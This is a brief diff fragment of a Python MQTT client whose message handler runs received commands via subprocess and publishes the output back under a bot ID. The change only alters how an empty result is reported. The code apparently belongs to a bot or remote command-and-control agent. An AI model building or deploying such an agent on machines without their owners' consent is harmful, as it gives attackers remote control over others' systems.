@@ -38,7 +38,7 @@ def on_message(client, userdata, msg):
                 result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
 
             if(result == ""):
-                return f"{action} command executed"
+                result = f"Command {action} executed successfully."
             client.publish(TOPIC, f"{BOT_ID}_RES: {result}")
         except Exception as e:
             client.publish(TOPIC, f"{BOT_ID}_ERR: {str(e)}")
